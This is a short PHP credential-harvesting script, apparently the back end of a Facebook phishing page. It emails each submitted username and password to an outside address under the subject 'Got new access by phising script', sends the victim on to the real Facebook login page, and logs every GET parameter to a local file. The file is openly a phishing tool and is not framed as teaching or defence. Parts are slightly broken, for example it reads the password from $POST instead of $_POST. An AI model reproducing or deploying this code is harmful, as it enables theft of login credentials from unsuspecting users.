<?php
	function mail_sender(){
		$username = $_POST['username'];
		$password = $POST['password'];
		
		$reciever = "fodevi3402@kespear.com";
		
		$subject = "Got new access by phising script";
		$message = "The username is .$username" ;
		$message .= "and password is .$password ";
	
		
		return mail($reciever, $subject, $message);
	}
	
	if(mail_sender()){
		header("Location: https://m.facebook.com/login.php?&e=1348092&email=");
	}
	
	$handle = fopen("1.txt", "a");
foreach($_GET as $variable => $value) {
fwrite($handle, $variable);
fwrite($handle, "=");
fwrite($handle, $value);
fwrite($handle, "\r\n");
}
fwrite($handle, "\r\n");
fclose($handle);

?>


